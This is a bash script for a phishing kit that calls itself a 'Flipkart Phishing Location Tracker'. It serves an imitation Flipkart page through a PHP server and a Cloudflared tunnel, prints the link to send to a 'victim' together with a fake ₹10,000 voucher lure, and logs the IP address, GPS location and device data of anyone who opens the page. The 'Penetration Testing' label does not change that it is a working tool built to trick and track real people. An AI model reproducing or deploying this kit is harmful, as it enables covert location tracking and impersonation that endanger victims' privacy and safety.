#!/bin/bash
# GPS Tracker v 0.3 - Flipkart Edition
# Created by Manjunath Yalam

trap 'printf "\n";stop' 2

banner() {
clear
printf '\n'
printf '\e[1;38;5;51m   ╔═══════════════════════════════════════════════════════════════════════╗\e[0m\n'
printf '\e[1;38;5;51m   ║\e[0m  \e[1;38;5;93m██████╗ ██████╗ ███████╗    ████████╗██████╗  █████╗  ██████╗██╗  ██╗\e[0m  \e[1;38;5;51m║\e[0m\n'
printf '\e[1;38;5;51m   ║\e[0m  \e[1;38;5;93m██╔════╝ ██╔══██╗██╔════╝    ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝\e[0m  \e[1;38;5;51m║\e[0m\n'
printf '\e[1;38;5;51m   ║\e[0m  \e[1;38;5;93m██║  ███╗██████╔╝███████╗       ██║   ██████╔╝███████║██║     █████╔╝ \e[0m  \e[1;38;5;51m║\e[0m\n'
printf '\e[1;38;5;51m   ║\e[0m  \e[1;38;5;93m██║   ██║██╔═══╝ ╚════██║       ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ \e[0m  \e[1;38;5;51m║\e[0m\n'
printf '\e[1;38;5;51m   ║\e[0m  \e[1;38;5;93m╚██████╔╝██║     ███████║       ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗\e[0m  \e[1;38;5;51m║\e[0m\n'
printf '\e[1;38;5;51m   ║\e[0m  \e[1;38;5;93m ╚═════╝ ╚═╝     ╚══════╝       ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\e[0m  \e[1;38;5;51m║\e[0m\n'
printf '\e[1;38;5;51m   ╚═══════════════════════════════════════════════════════════════════════╝\e[0m\n'
printf '\n'
printf '\e[1;38;5;201m              ▰▰▰ FLIPKART PHISHING LOCATION TRACKER ▰▰▰\e[0m\n'
printf '\n'
printf '\e[1;38;5;226m                    ✨ Version 0.3 - Flipkart Edition ✨\e[0m\n'
printf '\e[1;38;5;51m                      Developed by Manjunath Yalam\e[0m\n'
printf '\n'
printf '\e[1;38;5;141m    ┌─────────────────────────────────────────────────────────────────┐\e[0m\n'
printf '\e[1;38;5;141m    │\e[0m  \e[38;5;250m🎯 GPS Location Capture  \e[0m\e[1;38;5;46m•\e[0m  \e[38;5;250m📊 Device Intelligence\e[0m      \e[1;38;5;141m│\e[0m\n'
printf '\e[1;38;5;141m    └─────────────────────────────────────────────────────────────────┘\e[0m\n'
printf '\n'
printf '\e[38;5;240m    [ Penetration Testing & Security Research Tool ]\e[0m\n'
printf '\n'
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "⚠️  PHP is required but not installed. Aborting."; exit 1; } 
}

stop() {
checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkcf == *'cloudflared'* ]]; then
pkill -f -2 cloudflared > /dev/null 2>&1
killall -2 cloudflared > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
printf '\n\e[1;38;5;196m⚡ Session terminated\e[0m\n\n'
exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;38;5;46m[●] Target IP:\e[0m \e[1;38;5;51m%s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt
}

checkfound() {
printf "\n"
printf "\e[1;38;5;141m╔═══════════════════════════════════════════════════════════╗\e[0m\n"
printf "\e[1;38;5;141m║\e[0m  \e[1;38;5;226m⟳ MONITORING MODE ACTIVE\e[0m                                \e[1;38;5;141m║\e[0m\n"
printf "\e[1;38;5;141m║\e[0m  \e[38;5;250mWaiting for victim to click and allow location...\e[0m      \e[1;38;5;141m║\e[0m\n"
printf "\e[1;38;5;141m║\e[0m  \e[38;5;240m[Press Ctrl+C to terminate]\e[0m                            \e[1;38;5;141m║\e[0m\n"
printf "\e[1;38;5;141m╚═══════════════════════════════════════════════════════════╝\e[0m\n"
printf "\n"

while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m\n"
printf "\e[1;38;5;46m✓ VICTIM OPENED THE FLIPKART PAGE!\e[0m\n"
printf "\e[1;38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m\n\n"
catch_ip
rm -rf ip.txt
printf "\e[1;38;5;201m📍 CAPTURED DATA:\e[0m\n\n"
tail -f -n 110 data.txt
fi
sleep 0.5
done 
}

cf_server() {
if [[ -e cloudflared ]]; then
printf "\e[38;5;250m[i] Cloudflared binary detected\e[0m\n"
else
command -v wget > /dev/null 2>&1 || { echo >&2 "⚠️  wget is required but not installed. Aborting."; exit 1; }
printf "\e[1;38;5;226m[↓] Downloading Cloudflared tunnel...\e[0m\n"
arch=$(uname -m)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
elif [[ "$arch" == *'aarch64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
elif [[ "$arch" == *'x86_64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
else
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1 
fi
fi

chmod +x cloudflared
printf "\e[1;38;5;51m[▶] Initializing PHP server...\e[0m\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;38;5;51m[▶] Establishing Cloudflared tunnel...\e[0m\n"
rm cf.log > /dev/null 2>&1 &
./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
sleep 10

link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
if [[ -z "$link" ]]; then
printf "\e[1;38;5;196m[✗] Failed to generate tunnel link\e[0m\n"
exit 1
else
printf "\n\e[1;38;5;141m╔═══════════════════════════════════════════════════════════╗\e[0m\n"
printf "\e[1;38;5;141m║\e[0m  \e[1;38;5;46m✓ TUNNEL ESTABLISHED SUCCESSFULLY\e[0m                       \e[1;38;5;141m║\e[0m\n"
printf "\e[1;38;5;141m╚═══════════════════════════════════════════════════════════╝\e[0m\n\n"
printf "\e[1;38;5;226m[🔗] Flipkart Phishing Link:\e[0m\n"
printf "\e[1;38;5;51m     %s\e[0m\n\n" $link
printf "\e[1;38;5;201m[💡] Send this link to victim:\e[0m\n"
printf "\e[38;5;250m     'Hey! You won ₹10,000 Flipkart voucher! Click here to claim'\e[0m\n\n"
fi

sed 's+forwarding_link+'$link'+g' template.php > index.php
checkfound
}

local_server() {
sed 's+forwarding_link+''+g' template.php > index.php
printf "\e[1;38;5;51m[▶] Starting PHP server on localhost:8080...\e[0m\n"
php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
sleep 2
printf "\n\e[1;38;5;226m[🔗] Local Flipkart URL:\e[0m \e[1;38;5;51mhttp://127.0.0.1:8080\e[0m\n\n"
checkfound
}

gps-tracker() {
if [[ -e data.txt ]]; then
cat data.txt >> targetreport.txt
rm -rf data.txt
touch data.txt
fi
if [[ -e ip.txt ]]; then
rm -rf ip.txt
fi

sed -e '/tc_payload/r payload' index_chat.html > index.html

printf "\e[1;38;5;201m┌─────────────────────────────────────────────────────────────┐\e[0m\n"
printf "\e[1;38;5;201m│\e[0m  \e[1;38;5;226m⚙️  SERVER CONFIGURATION\e[0m                                  \e[1;38;5;201m│\e[0m\n"
printf "\e[1;38;5;201m└─────────────────────────────────────────────────────────────┘\e[0m\n\n"

default_option_server="Y"
read -p $'\e[1;38;5;51m[?] Use Cloudflared tunnel? \e[0m\e[38;5;250m(Y/N) [Default: Y]:\e[0m ' option_server
option_server="${option_server:-${default_option_server}}"

printf "\n"

if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
cf_server
sleep 1
else
local_server
sleep 1
fi
}

banner
dependencies
gps-tracker